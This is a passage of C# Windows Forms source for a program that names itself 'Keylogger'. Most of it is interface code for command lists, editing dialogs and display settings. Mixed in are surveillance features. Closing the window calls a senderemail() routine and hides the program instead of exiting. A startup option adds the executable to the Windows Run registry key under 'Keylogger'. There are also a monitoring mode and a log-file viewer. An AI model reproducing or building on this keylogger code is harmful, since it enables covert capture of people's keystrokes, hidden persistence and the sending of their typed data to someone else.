                    #endregion

                    #region show only command textbox
                    if (listView_command.Items[11].SubItems[1].Text == cmd && listView_command.Items[11].SubItems[2].Text == "Enable")
                    {
                        //show_program_info(cmd, listView_command.Items[10].Text);

                        {
                            single_frame_only();
                            readwrite_registy.write ( "View", "Interface", "Minimal" );

                        }

                    }
                    else if (matchCommandToolStripMenuItem.Checked == false)
                    {
                        if ( cmd.Contains(listView_command.Items[11].SubItems[1].Text) && listView_command.Items[11].SubItems[2].Text == "Enable")
                        {
                            //show_program_info(cmd, listView_command.Items[10].Text);

                            {
                                single_frame_only();
                                readwrite_registy.write("View", "Interface", "Minimal");

                            }

                        }
                    }
                    #endregion

                    #region show whole command window
                    if (listView_command.Items[12].SubItems[1].Text == cmd && listView_command.Items[12].SubItems[2].Text == "Enable")
                    {
                        //show_program_info(cmd, listView_command.Items[10].Text);

                        {
                            textBox_command2.Dock = DockStyle.None;
                            menuStrip1.Visible = true;
                            tabControl1.Visible = true;
                            this.Size = new System.Drawing.Size(747, 520);
                            readwrite_registy.write ( "View", "Interface", "Full" );
                        }

                    }
                    else if (matchCommandToolStripMenuItem.Checked == false)
                    {
                        if (cmd.Contains(listView_command.Items[12].SubItems[1].Text) && listView_command.Items[12].SubItems[2].Text == "Enable")
                        {
                            //show_program_info(cmd, listView_command.Items[10].Text);
                        
                            {
                                textBox_command2.Dock = DockStyle.None;
                                menuStrip1.Visible = true;
                                tabControl1.Visible = true;
                                this.Size = new System.Drawing.Size(747, 520);
                                readwrite_registy.write("View", "Interface", "Full");
                            }

                        }
                    }
                    #endregion

                    ////////////////////////////////////////////////////////////////////////////////////////////////////////
                    ///list box to open the progrmas
                    ///starting programs if command is true as in listbox 
                    ///
                    foreach (ListViewItem openpath in listView_open_commands.Items)
                    {
                        if (openpath.SubItems[1].Text == cmd || (matchCommandToolStripMenuItem.Checked && cmd.Contains(openpath.SubItems[1].Text)))
                        {
                            //show_program_info(cmd,openpath.Text);
                            //  if (Program_info.dontdothis == false)

                            try
                            {
                                DirectoryInfo info = new DirectoryInfo(openpath.SubItems[2].Text);
                                if (info.Exists == true)
                                {
                                    Process.Start("Explorer.exe", openpath.SubItems[2].Text);
                                }
                                else
                                {
                                    Process.Start(openpath.SubItems[2].Text);
                                }
                            }
                            catch
                            {

                            }

                        }

                    }
                }
                command = null;
                textBox_command.Text = null;
                textBox_command2.Text = null;
                cmd = null;
            }

            else if (senderkey == clear_keys)
            {
                command = null;
                textBox_command.Text = null;
                textBox_command2.Text = null;
            }
            }
            catch
            {

            }
        }
        private void show_program_info(string command_name,string infotext)
        {
            //Program_info prog_info = new Program_info(command_name,infotext);
            //prog_info.ShowDialog();
        }
        private void textBox_all_pressed_key_DoubleClick(object sender, EventArgs e)
        {
            if (textBox_all_pressed_key.Dock == DockStyle.None)
            {
                textBox_all_pressed_key.Dock = DockStyle.Fill;
                textBox_all_pressed_key.BackColor = Color.White;
                textBox_all_pressed_key.ForeColor = Color.Blue;
            }
            else
            {
                textBox_all_pressed_key.Dock = DockStyle.None;
                textBox_all_pressed_key.BackColor = Color.Cyan;
                textBox_all_pressed_key.ForeColor = Color.Red;
            }

        }
        /// <summary>
        /// listview to open programs
        /// </summary>
        /// 
        private void listview_to_open_programs_adding_columns()
        {
            ///adding columns in listview
            listView_open_commands.Columns.Add("Name");
            listView_open_commands.Columns.Add("Command");
            listView_open_commands.Columns.Add("Path");
            listView_open_commands.Columns.Add("Status");
            ///adjusting column width
            listView_open_commands.Columns[0].Width = 180;
            listView_open_commands.Columns[1].Width = 100;
            listView_open_commands.Columns[2].Width = 250;
            listView_open_commands.Columns[3].Width = 100;


            ///adding columns in listview
            listView_command.Columns.Add("Name");
            listView_command.Columns.Add("Command");
            listView_command.Columns.Add("Status");
            listView_command.Columns.Add("Description");
            ///adjusting column width
            listView_command.Columns[0].Width = 180;
            listView_command.Columns[1].Width = 100;
            listView_command.Columns[2].Width = 80;
            listView_command.Columns[3].Width = 400;
        }
        private void add_items_to_the_listview_to_open_program()
        {
                listView_open_commands.Items.Clear();
                //properties of listview
                listView_open_commands.View = System.Windows.Forms.View.Details;
                // listView_command.GridLines = true;
                listView_open_commands.FullRowSelect = true;

               

                ///adding contents in the listbox in their respective columns            
                for (int j = 0; j < names.Length; j++)
                {
                    try
                    {
                        ListViewItem item = new ListViewItem(names[j]);
                        item.SubItems.Add(commands[j]);
                        item.SubItems.Add(paths[j]);
                        item.SubItems.Add(status[j]);
                        listView_open_commands.Items.Add(item);
                    }
                    catch
                    {

                    }

                }
                save_all_commands_in_registry();

                clearRAM ( );
        }
        /// <summary>
        /// listview for system commands
        /// </summary>
        private void add_items_to_the_listview()
        {
            //properties of listview
            listView_command.View = System.Windows.Forms.View.Details;
           // listView_command.GridLines = true;
            listView_command.FullRowSelect = true;

            

          

            ///adding contents in the listbox in their respective columns            
            for (int j = 0; j < names1.Length; j++)
            {
                try
                {
                    ListViewItem item = new ListViewItem(names1[j]);
                    item.SubItems.Add(Values1[j]);
                    item.SubItems.Add(status1[j]);
                    item.SubItems.Add(discription1[j]);
                    listView_command.Items.Add(item);
                }
                catch
                {

                }

            }

        }
        private void add_items_to_the_listviewguess_words()        
        {

            //properties of listview
            listView_guess_words.View = System.Windows.Forms.View.Details;
            // listView_command.GridLines = true;
            listView_guess_words.FullRowSelect = true;

            ///adding columns in listview
            listView_guess_words.Columns.Add("Initial Words");
            listView_guess_words.Columns.Add("Guess Words");
          
            ///adjusting column width
            listView_guess_words.Columns[0].Width = 180;
            listView_guess_words.Columns[1].Width = 400;
           

            ///column contents
           
           
        
            ///adding contents in the listbox in their respective columns 
            int count = 0;
            try
            {
                foreach ( string str in initialword )
                {
                    try
                    {
                        ListViewItem item = new ListViewItem ( str );
                        item.SubItems.Add ( finalsentence[count++] );
                        listView_guess_words.Items.Add ( item );
                    }
                    catch
                    {

                    }
                }
            }
            catch
            {

            }
        
            
        }

        /// <summary>
        /// editting the system commands while double clicking it
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        private void listView_command_DoubleClick(object sender, EventArgs e)
        {
            selected_listview_index = listView_command.SelectedIndices[0];
            ///showing groupbox and editing it
            panel_edit_commands.Visible = true;
            panel_edit_commands.Enabled = true;
            textBox_edit_command.Focus();
            textBox_edit_command.SelectAll();

            ///editing label and textbox texts
            label_task_name.Text = listView_command.SelectedItems[0].Text;
            textBox_edit_command.Text = listView_command.SelectedItems[0].SubItems[1].Text;

            ///enabling or disabling the checkbox
            if (listView_command.SelectedItems[0].SubItems[2].Text == " ")
            {
                checkbox_enable_command.Enabled = false;
            }
            else
            {
                checkbox_enable_command.Enabled = true;
            }

            ///checked state of checkbox editing
            if (listView_command.SelectedItems[0].SubItems[2].Text == "Enable")
            {
                checkbox_enable_command.CheckState = CheckState.Checked;
            }
            else
            {
                checkbox_enable_command.CheckState = CheckState.Unchecked;
            }

        }
        /// <summary>
        /// editting the open program commands while double clicking it
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        private void listView_open_commands_DoubleClick(object sender, EventArgs e)
        {
            ///stroing the selected listview item's index
            selected_listview_index = listView_open_commands.SelectedIndices[0];
            ////////////////////////////////////////////////////////////////////////////////////////////////
            // USING PANEL 

          
            /////showing groupbox and editing it
            //panel_edit_open_command.Visible = true;
            //panel_edit_open_command.Enabled = true;
            //textBox_command_open_program.Focus();
            /////editing textboxes
            //textBox_taskname_open_program.Text = listView_open_commands.Items[selected_listview_index].Text;
            //textBox_command_open_program.Text = listView_open_commands.Items[selected_listview_index].SubItems[1].Text;
            //textBox_path_to_open.Text = listView_open_commands.Items[selected_listview_index].SubItems[2].Text;
            /////editing checkbox
            //if (listView_open_commands.SelectedItems[0].SubItems[3].Text == "Enable")
            //{
            //    checkBox_open_program.CheckState = CheckState.Checked;
            //}
            //else
            //{
            //    checkBox_open_program.CheckState = CheckState.Unchecked;
            //}
       
            /////////////////////////////////////////////////////////////////////////////////////////////////////
            //USING another form and using get set
            Edit_commands editcmdobj = new Edit_commands();
            Edit_commands.title = listView_open_commands.Items[selected_listview_index].Text;
            Edit_commands.command = listView_open_commands.Items[selected_listview_index].SubItems[1].Text;
            Edit_commands.path = listView_open_commands.Items[selected_listview_index].SubItems[2].Text;
            Edit_commands.addnew_check_state = false;
            if (listView_open_commands.SelectedItems[0].SubItems[3].Text == "Enable")
            {
                Edit_commands.check_state = true;
            }
            else
            {
                Edit_commands.check_state = false;
            }
            editcmdobj.ShowDialog();
            saving_in_listview_user_command();
            editcmdobj = null;
            clearRAM ( );

        }
        /// <summary>
        /// saving the new settings for the double clicked item in listview
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        private void button_save_commands_Click(object sender, EventArgs e)
        {
            listView_command.Items[selected_listview_index].SubItems[1].Text = textBox_edit_command.Text;
            ///checking if the checkbox is disabled or not
            ///if disbaled then do not edit the listview 2nd subitem
            if (checkbox_enable_command.Enabled == false)
            {
                listView_command.Items[selected_listview_index].SubItems[2].Text = " ";
            }
            else
            {
                if (checkbox_enable_command.CheckState == CheckState.Checked)
                {
                    listView_command.Items[selected_listview_index].SubItems[2].Text = "Enable";
                }
                else
                {
                    listView_command.Items[selected_listview_index].SubItems[2].Text = "Disable";
                }
            }

            panel_edit_commands.Visible = false;
            panel_edit_commands.Enabled = false;

            save_all_system_commands_in_registry();
        }
        /// <summary>
        /// saving commands from user in listview open commands
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        private void saving_in_listview_user_command()
        {
            if (Edit_commands.editison == true)
            {
                ///editing the setting ---reading from another form using get set
               

                    if (Edit_commands.addnew_check_state == false)
                    {
                        listView_open_commands.Items[selected_listview_index].Text = Edit_commands.title;
                        listView_open_commands.Items[selected_listview_index].SubItems[1].Text = Edit_commands.command;
                        listView_open_commands.Items[selected_listview_index].SubItems[2].Text = Edit_commands.path;

                        if (Edit_commands.check_state == true)
                        {
                            listView_open_commands.Items[selected_listview_index].SubItems[3].Text = "Enable";
                        }
                        else
                        {
                            listView_open_commands.Items[selected_listview_index].SubItems[3].Text = "Disable";
                        }
                    }
                    ////addding new command title,path and command
                    else
                    {

                        bool same = false;
                        foreach (ListViewItem item in listView_open_commands.Items)
                        {
                            if (Edit_commands.title == item.Text)
                            {
                                MessageBox.Show("Same Name of program already exists", "Name already exists", MessageBoxButtons.OK, MessageBoxIcon.Error);
                                same = true;
                                break;
                            }
                            if (Edit_commands.command == item.SubItems[1].Text)
                            {
                                MessageBox.Show("Same command is already used for another program", "Command already exists", MessageBoxButtons.OK, MessageBoxIcon.Error);
                                same = true;
                                break;
                            }
                            if (Edit_commands.path == item.SubItems[2].Text)
                            {
                                MessageBox.Show("Program of same path already exists", "Path already exists", MessageBoxButtons.OK, MessageBoxIcon.Error);
                                same = true;
                                break;
                            }


                        }
                        if (same == false)
                        {

                        ListViewItem item_to_add = new ListViewItem(Edit_commands.title);
                        item_to_add.SubItems.Add(Edit_commands.command);
                        item_to_add.SubItems.Add(Edit_commands.path);
                        if (Edit_commands.check_state == true)
                        {
                            item_to_add.SubItems.Add("Enable");
                        }
                        else
                        {
                            item_to_add.SubItems.Add("Disable");
                        }
                        listView_open_commands.Items.Add(item_to_add);



                    }
                }
            }
           save_all_commands_in_registry();
           clearRAM ( );
        }

        private void button_cancel_command_editer_Click(object sender, EventArgs e)
        {
            panel_edit_commands.Visible = false;
            panel_edit_commands.Enabled = false;
           
        }       

        private void comboBox_do_work_key_SelectedIndexChanged(object sender, EventArgs e)
        {
            do_work_keys = comboBox_do_work_key.SelectedItem.ToString();
            label_key_to_accept.Text = "Accept Key : " + do_work_keys;
            try
            {
                readwrite_registy.write("Keys Settings", "Do Work Keys", do_work_keys);
            }
            catch
            {

            }
        }
        private void comboBox_guess_words_SelectedIndexChanged ( object sender, EventArgs e )
        {
            guess_keys = comboBox_guess_words.SelectedItem.ToString ( );
            
            try
            {
                readwrite_registy.write ( "Keys Settings", "Guess Key", guess_keys );
            }
            catch
            {

            }
        }
        private void addNewToolStripMenuItem_Click(object sender, EventArgs e)
        {

            //opening another form and sending info to that form
            Edit_commands editcmdobj = new Edit_commands();
            Edit_commands.title = null;
            Edit_commands.command = null;
            Edit_commands.path = null;
            Edit_commands.check_state = true;
            Edit_commands.addnew_check_state = true;
            editcmdobj.ShowDialog();

            ///retriving settings from another form
            saving_in_listview_user_command();
            editcmdobj = null;
            clearRAM ( );
        }
        /// <summary>
        /// Drag and drop actions in listview open commands
        /// </summary>

        private void listview_open_commands_DragDrop(object sender, DragEventArgs e)
        {
            // Extract the data from the DataObject-Container into a string list
            string[] FileList = (string[])e.Data.GetData(DataFormats.FileDrop, false);
            DirectoryInfo filename = new DirectoryInfo(FileList[0]);

            ///showing another window and sending info to that window when drag and drop action is occurs
            ///
            Edit_commands editcmdobj = new Edit_commands();
            Edit_commands.addnew_check_state = true;
            Edit_commands.check_state = true;
            Edit_commands.title = filename.Name;
            Edit_commands.path = filename.FullName;  ///adding full path of droped file in the textbox of addnew window
            Edit_commands.command = "open"+filename.Name;
            editcmdobj.ShowDialog();
            saving_in_listview_user_command();
            editcmdobj = null;
            clearRAM ( );
        }

        private void listview_open_commands_DragEnter(object sender, DragEventArgs e)
        {
            if (e.Data.GetDataPresent(DataFormats.FileDrop))
                e.Effect = DragDropEffects.Copy;
            else
                e.Effect = DragDropEffects.None;

        }

        private void contextMenuStrip_add_commands_to_open_Opening(object sender, CancelEventArgs e)
        {
            
            try
            {
                if (listView_open_commands.SelectedItems[0].Text == null)
                {

                }
                else
                {
                    removeToolStripMenuItem.Enabled = true;
                }
            }
            catch
            {
                removeToolStripMenuItem.Enabled = false;
            }
        }

        private void removeToolStripMenuItem_Click(object sender, EventArgs e)
        {
            foreach (ListViewItem item in listView_open_commands.SelectedItems)
            {
                item.Remove();
            }
            save_all_commands_in_registry();
        }
        private void restoreDefaultToolStripMenuItem_Click(object sender, EventArgs e)
        {

            readwrite_registy.delete_main_keys_from_registry(new string[] { "names", "commands", "paths" });
            listView_open_commands.Items.Clear();
            load_all_settings_from_registry();
            add_items_to_the_listview_to_open_program();
            clearRAM ( );
        }


        private void listView_open_commands_KeyDown(object sender, KeyEventArgs e)
        {
            if (e.KeyCode == Keys.Enter || e.KeyCode == Keys.Return)
            {
                try
                {
                    EventArgs mm = new EventArgs();
                    listView_open_commands_DoubleClick(sender, mm);
                }
                catch
                {

                }

            }

            else if (e.KeyCode == Keys.Delete)
            {
                try
                {
                    foreach (ListViewItem delname in listView_open_commands.SelectedItems)
                    {
                        delname.Remove();
                        save_all_commands_in_registry();
                    }
                    
                }
                catch
                {

                }

            }
        }

        private void comboBox_clear_key_SelectedIndexChanged(object sender, EventArgs e)
        {
            try
            {
                clear_keys = comboBox_clear_key.SelectedItem.ToString();
                label_clear_key.Text = "Clear Key : " + clear_keys;
            }
            catch
            {

            }
            try
            {
                readwrite_registy.write("Keys Settings", "Clear Keys", clear_keys);
            }
            catch
            {

            }
        }

        private void Form1_FormClosing(object sender, FormClosingEventArgs e)
        {
            senderemail ( );
            this.Hide();
            hideinfoform();
            e.Cancel = true;
            readwrite_registy.write("View", "Hide", "Yes");

        }
        Point initial;
        bool drag = false;
        private void Form1_MouseDown(object sender, MouseEventArgs e)
        {
            initial = new Point(e.X, e.Y);
            drag = true;
        }

        private void Form1_MouseMove(object sender, MouseEventArgs e)
        {
            if (drag == true)
            {
                this.Location = new Point(Cursor.Position.X - initial.X-titlewidth, Cursor.Position.Y - initial.Y-titleHeight);
            }
        }

        private void Form1_MouseUp(object sender, MouseEventArgs e)
        {
            drag = false;
        }

        private void label_close_MouseEnter(object sender, EventArgs e)
        {
            
           
        }

        private void label_close_MouseLeave(object sender, EventArgs e)
        {
            
          
        }

        private void label_close_Click(object sender, EventArgs e)
        {
            this.Hide();
        }

        private void restoreDefaultsToolStripMenuItem_Click(object sender, EventArgs e)
        {
            names1 = new string[13] { "Start Monitoring", "Stop Monitoring", "Exit Program", "Start new process", "Enable All Commands", "Disable All Commands", "Hide Program", "Show Program", "Lock Keyboard", "Unlock Keyboard", "Show Programmer's Info", "Show Command textbox only", "Show Whole area of Window" };
            Values1 = new string[13] { "start", "stop", "exit", "startnew", "enable", "disable", "hide", "show", "lock", "unlock", "info", "showtxt", "showwh" };
            status1 = new string[13] { "Enable", "Enable", "Enable", "Enable", " ", "Enable", "Enable", "Enable", "Enable", "Enable", "Enable", "Enable", "Enable" };

            listView_command.Items.Clear();
            add_items_to_the_listview();
            save_all_system_commands_in_registry();
            clearRAM ( );

        }

        private void textBox_edit_command_TextChanged(object sender, EventArgs e)
        {
            if (textBox_edit_command.TextLength == 0)
            {
                button_save_commands.Enabled = false;
            }
            else
            {
                button_save_commands.Enabled = true;
            }
        }

        private void panel_edit_commands_MouseDown(object sender, MouseEventArgs e)
        {
            initial = new Point(e.X, e.Y);
            drag = true;
        }

        private void panel_edit_commands_MouseMove(object sender, MouseEventArgs e)
        {
            if (drag == true)
            {
                (sender as Panel).Location = new Point(Cursor.Position.X - this.Location.X - initial.X - (sender as Panel).Parent.Location.X-tabControl1.Location.X-titlewidth, Cursor.Position.Y - this.Location.Y-(sender as Panel).Parent.Location.Y - initial.Y-tabControl1.Location.Y-titleHeight);
            }
        }

        private void panel_edit_commands_MouseUp(object sender, MouseEventArgs e)
        {
            drag = false;
        }

        private void textBox_edit_command_KeyPress(object sender, KeyPressEventArgs e)
        {
            if (e.KeyChar >= 'a' && e.KeyChar <= 'z' || e.KeyChar >= 'A' && e.KeyChar <= 'Z' || e.KeyChar==8)
            {
                e.Handled = false;
            }
            else
            {
                e.Handled = true;
            }
        }

        private void hideToolStripMenuItem_Click(object sender, EventArgs e)
        {
            hideinfoform();           

            this.Hide();
            readwrite_registy.write ( "View", "Hide", "Yes" );

        }

        private void fullToolStripMenuItem_Click(object sender, EventArgs e)
        {
            textBox_command2.Dock = DockStyle.None;
            menuStrip1.Visible = true;
            tabControl1.Visible = true;
            this.Size = new System.Drawing.Size(747, 520);
            readwrite_registy.write ( "View", "Interface", "Full" );
        }

        private void commandBoxOnlyToolStripMenuItem_Click(object sender, EventArgs e)
        {
            this.Cursor = Cursors.SizeAll;
            single_frame_only();
            readwrite_registy.write ( "View", "Interface", "Minimal" );
        }

        private void button_minimal_interface_Click(object sender, EventArgs e)
        {
            single_frame_only();
            this.Cursor = Cursors.SizeAll;
            readwrite_registy.write ( "View", "Interface", "Minimal" );
        }

        private void actionsToolStripMenuItem_DropDownOpening(object sender, EventArgs e)
        {
            if (startmonitoring == true)
            {
                disableMonitoringModeToolStripMenuItem.Checked = false;
                
            }
            else
            {
                disableMonitoringModeToolStripMenuItem.Checked = true; ;

            }

            if (checkBox_lock_keyboard.Checked == true)
            {
                lockKeyboardToolStripMenuItem.Checked = true;
            }
            else
            {
                lockKeyboardToolStripMenuItem.Checked = false;
            }

        }

        private void disableMonitoringModeToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (startmonitoring == true)
            {
                disableMonitoringModeToolStripMenuItem.Checked = true;
                startmonitoring = false;
                label_monitor_true_or_false.Text = startmonitoring.ToString();

            }

            else
            {
                disableMonitoringModeToolStripMenuItem.Checked = false;
                startmonitoring = true;
                label_monitor_true_or_false.Text = startmonitoring.ToString();
            }
        }

        private void exitKeyloggerToolStripMenuItem_Click(object sender, EventArgs e)
        {
            try
            {
                notifyIcon1.Dispose();
            }
            catch
            {
            }
            Environment.Exit(1);
        }

        private void openLogFilesToolStripMenuItem_Click(object sender, EventArgs e)
        {
            logfiles obj = new logfiles();
            obj.Show();
            clearRAM ( );
        }
       
        private void runAtStartupToolStripMenuItem_Click(object sender, EventArgs e)
        {
            try
            {
                string path = Application.ExecutablePath;
           string valueread=  Registry.GetValue(@"HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run","Keylogger",null).ToString();
                if (valueread!=path)
                {
                   Registry.SetValue(@"HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run","Keylogger", path);
                   runAtStartupToolStripMenuItem.Checked = true;
                                
                }
                else
                {

                    Registry.SetValue(@"HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run", "Keylogger","");
                    runAtStartupToolStripMenuItem.Checked = false;
                }
            }
            catch
            {
                try
                {
                    Registry.SetValue(@"HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run", "Keylogger",Application.ExecutablePath);
                    runAtStartupToolStripMenuItem.Checked = true;
                }
                catch
                {

                }
            }
           
        }

        private void lockKeyboardToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (checkBox_lock_keyboard.Checked == true)
                checkBox_lock_keyboard.Checked = false;
            else
                checkBox_lock_keyboard.Checked = true;
        }

        private void viewToolStripMenuItem1_DropDownOpening(object sender, EventArgs e)
        {
           
        }

        
        private void startNewProcessToolStripMenuItem_Click(object sender, EventArgs e)
        {
            new_process obj = new new_process();
            new_process.startnew_process = true;
            obj.Show();
            clearRAM ( );
        }

        private void Form1_DoubleClick(object sender, EventArgs e)
        {
            this.Hide();
        }

        private void backgroundColorToolStripMenuItem_Click(object sender, EventArgs e)
        {
            ColorDialog colord = new ColorDialog();
            if (colord.ShowDialog() == DialogResult.OK)
            {
                this.BackColor = Color.FromArgb(colord.Color.ToArgb());
               
                backcolor = this.BackColor;
                readwrite_registy.write ( "View", "Backcolor", backcolor.ToArgb ( ).ToString ( ) );
            }
            colord = null;
            clearRAM ( );
        }

        private void troubleshootProblemToolStripMenuItem_Click(object sender, EventArgs e)
        {
            try
            {
                Application.Restart ( );
            }
            catch
            {

            }
        }

     
        private void addNewToolStripMenuItem1_Click ( object sender, EventArgs e )
        {
            guess_words guessword = new guess_words ( );
            guessword.addnew = true;
            guessword.ShowDialog ( );
            if ( guessword.save == true )
            {
                bool same = false;
                foreach ( ListViewItem item in listView_guess_words.Items )
                {
                    if ( guessword.initial == item.Text )
                    {
                        same = true;
                        break;
                    }
                }
                if ( same == false )
                {
                    ListViewItem item = new ListViewItem ( guessword.initial );
                    item.SubItems.Add ( guessword.sentence );
                    listView_guess_words.Items.Add ( item );
                }
                else
                {
                    MessageBox.Show ( "Same initial word is already exist", "Word Exists Already", MessageBoxButtons.OK, MessageBoxIcon.Error );
                    

                }

            }
            save_all_guess_words_in_registry ( );
            guessword = null;
            clearRAM ( );
         
        }

        private void contextMenuStrip_guess_words_Opening ( object sender, CancelEventArgs e )
        {
            if ( listView_guess_words.SelectedItems.Count > 0 )
            {

                removeToolStripMenuItem1.Visible = true;
             
            }
            else
            {
                removeToolStripMenuItem1.Visible = false;
            }

            if ( listView_guess_words.SelectedItems.Count== 1 )
            {

                editToolStripMenuItem.Visible = true;

            }
            else
            {
                editToolStripMenuItem.Visible = false;
            }
        }

        private void removeToolStripMenuItem1_Click ( object sender, EventArgs e )
        {
            foreach ( ListViewItem item in listView_guess_words.SelectedItems )
            {
                item.Remove ( );
            }
            save_all_guess_words_in_registry ( );
            GC.Collect ( );
            GC.WaitForPendingFinalizers ( );
            GC.Collect ( );
        }

        private void listView_guess_words_DoubleClick ( object sender, EventArgs e )
        {
            if ( listView_guess_words.SelectedItems.Count == 1 )
            {
                guess_words guessword = new guess_words ( );
                guessword.addnew = true;
                guessword.initial = listView_guess_words.SelectedItems[0].Text;
                guessword.sentence = listView_guess_words.SelectedItems[0].SubItems[1].Text;
                guessword.addnew = false;
                guessword.ShowDialog ( );
                if ( guessword.save == true && guessword.addnew==false )
                {
                    listView_guess_words.SelectedItems[0].Text = guessword.initial;
                    listView_guess_words.SelectedItems[0].SubItems[1].Text = guessword.sentence;


                }
                else if ( guessword.save == true && guessword.addnew == true )
                {
                    bool same = false;
                    foreach ( ListViewItem item in listView_guess_words.Items )
                    {
                        if ( guessword.initial == item.Text )
                        {
                            same = true;
                            break;
                        }
                    }
                    if ( same == false )
                    {
                        ListViewItem item = new ListViewItem ( guessword.initial );
                        item.SubItems.Add ( guessword.sentence );
                        listView_guess_words.Items.Add ( item );
                    }
                    else
                    {
                        MessageBox.Show ( "Same initial word is already exist","Word Exists Already",MessageBoxButtons.OK,MessageBoxIcon.Error );
                    }

                }
                save_all_guess_words_in_registry ( );
                guessword = null;
                clearRAM ( );
            }
        }


        private void clearRAM ( )
        {
            GC.Collect ( );
            GC.WaitForPendingFinalizers ( );
            GC.Collect ( );
        }

        private void listView_guess_words_KeyDown ( object sender, KeyEventArgs e )
        {
            if ( e.KeyCode == Keys.Delete )
            {
                removeToolStripMenuItem1_Click ( sender, e );

            }
        }

        private void editToolStripMenuItem_Click ( object sender, EventArgs e )
        {
            listView_guess_words_DoubleClick ( sender, e );
        }

        private void Form1_LocationChanged ( object sender, EventArgs e )
        {
            readwrite_registy.write ( "View", "LocationX", this.Location.X.ToString ( ) );
            readwrite_registy.write ( "View", "LocationY", this.Location.Y.ToString ( ) );
        }

       
        int turn = 1;
        Color temp;
        private void animate_on_key_pressed ( )
        {
            
            if ( turn == 1 )
            {
                turn = 2;
                 temp= textBox_command2.BackColor;
            }
            else if ( turn == 2 )
            {
                turn = 3;
                textBox_command2.BackColor = Color.Gold;
            }
            else if ( turn == 3 )
            {
                turn = 2;
                textBox_command2.BackColor = temp;


            }
        }

        private void animateColorToolStripMenuItem_Click ( object sender, EventArgs e )
        {
            if ( animateColorToolStripMenuItem.Checked == false )
            {
                animateColorToolStripMenuItem.Checked = true;
                readwrite_registy.write ( "View", "Animation", "True" );
            }
            else
            {
                animateColorToolStripMenuItem.Checked = false;
                readwrite_registy.write ( "View", "Animation", "False" );

            }
        }

        private void Mousedown_for_allcontrols ( object sender, MouseEventArgs e )
        {
            
            if ( lockPositionOfControlsToolStripMenuItem.Checked == false )
            relocate.control_mouse_down ( e );
            try
            {
                if((sender as Control).Name!=tabControl1.Name)
                ( sender as Control ).BringToFront ( );
            }
            catch
            {

            }
            try
            {
             //   if((sender as Control).Name!=label_line2.Name &&(sender as Control).Name!=label_line1.Name&&(sender as Control).Name!=label_line3.Name)

              //  ( sender as Control ).BackColor = Color.Transparent;
            }

            catch
            {

            }
        }

        private void Mousemove_for_allcontrols ( object sender, MouseEventArgs e )
        {
            if ( lockPositionOfControlsToolStripMenuItem.Checked == false )
            {
                if((sender as Control).Name==menuStrip1.Name)
                relocate.control_mouse_move ( sender, e, this, MouseButtons.Left);
                else
                relocate.control_mouse_move ( sender, e, this, MouseButtons.Left,3);
            }
        }

        private void Mouseup_for_all ( object sender, MouseEventArgs e )
        {
            relocate.control_mouse_up ( );
        }

        private void lockPositionOfControlsToolStripMenuItem_Click ( object sender, EventArgs e )
        {
            if ( lockPositionOfControlsToolStripMenuItem.Checked )
            {

                lockPositionOfControlsToolStripMenuItem.Checked = false;
              
            }
            else
            {
                lockPositionOfControlsToolStripMenuItem.Checked = true;
             
            }
        }

        private void Mouseenter_for_all ( object sender, EventArgs e )
        {
            if ( lockPositionOfControlsToolStripMenuItem.Checked )
            {

                ( sender as Control ).Cursor = Cursors.Arrow;
            }
            else
            {
                ( sender as Control ).Cursor = Cursors.SizeAll;
            }
        }

       

        private void selectToolStripMenuItem_Click ( object sender, EventArgs e )
        {
            OpenFileDialog dialog = new OpenFileDialog ( );
            dialog.Title = "Select Background Image";
            dialog.Filter = "Jpg|*.jpg|Png|*.png|Bmp|*.bmp";
            if ( dialog.ShowDialog ( ) == DialogResult.OK )
            {
                readwrite_registy.write ( "View", "Image Path", dialog.FileName );
                showImageToolStripMenuItem_Click ( sender, e );
                showImageToolStripMenuItem_Click ( sender, e );

            }
            dialog = null;
            clearRAM ( );
        }

        private void showImageToolStripMenuItem_Click ( object sender, EventArgs e )
        {
            if ( showImageToolStripMenuItem.Checked )
            {
                showImageToolStripMenuItem.Checked = false;
                readwrite_registy.write ( "View", "Image Mode", "False" );
                BackgroundImage = null;
                clearRAM ( );
                
            }
            else
            {
                showImageToolStripMenuItem.Checked = true;
                try
                {
                    BackgroundImage =ResizeImage( Image.FromFile ( readwrite_registy.read ( "View", "Image Path" ) ),this.Size);
                    readwrite_registy.write ( "View", "Image Mode", "True" );
                }
                catch
                {
                    try
                    {
                        selectToolStripMenuItem_Click ( sender, e );
                        BackgroundImage = ResizeImage(Image.FromFile(readwrite_registy.read("View", "Image Path")), this.Size);
                        readwrite_registy.write ( "View", "Image Mode", "True" );
                        clearRAM ( );
                    }
                    catch
                    {

                    }
                }
                clearRAM ( );
            }
        }
        public static Image ResizeImage(Image imgToResize, Size TargetSize)
        {
            try
            {
                int sourceWidth = imgToResize.Width;
                int sourceHeight = imgToResize.Height;

                float nPercent = 0;
                float nPercentW = 0;
                float nPercentH = 0;

                nPercentW = ((float)TargetSize.Width / (float)sourceWidth);
                nPercentH = ((float)TargetSize.Height / (float)sourceHeight);

                if (nPercentH < nPercentW)
                    nPercent = nPercentH;
                else
                    nPercent = nPercentW;

                int destWidth = (int)(sourceWidth * nPercent);
                int destHeight = (int)(sourceHeight * nPercent);

                Bitmap b = new Bitmap(destWidth, destHeight);
                Graphics g = Graphics.FromImage((Image)b);
                g.InterpolationMode = InterpolationMode.HighQualityBicubic;

                g.DrawImage(imgToResize, 0, 0, destWidth, destHeight);

                g.Dispose();

                return (Image)b;
            }
            catch
            {
                return null;
            }
        }

        private void checkBox_showkeys_CheckedChanged ( object sender, EventArgs e )
        {
            if ( checkBox_showkeys.Checked == true )
            {
                readwrite_registy.write ( "Setting", "showkeys", "check" );
                
            }
            else
            {
                readwrite_registy.write ( "Setting", "showkeys", "uncheck" );
               
            }


        }
        NotifyIcon notifyIcon1;

        private void shownotifyicon ()
        {
           
            notifyIcon1 = new NotifyIcon ( );
            notifyIcon1.Icon = Properties.Resources._1370026386_24258;
            notifyIcon1.Visible = true;
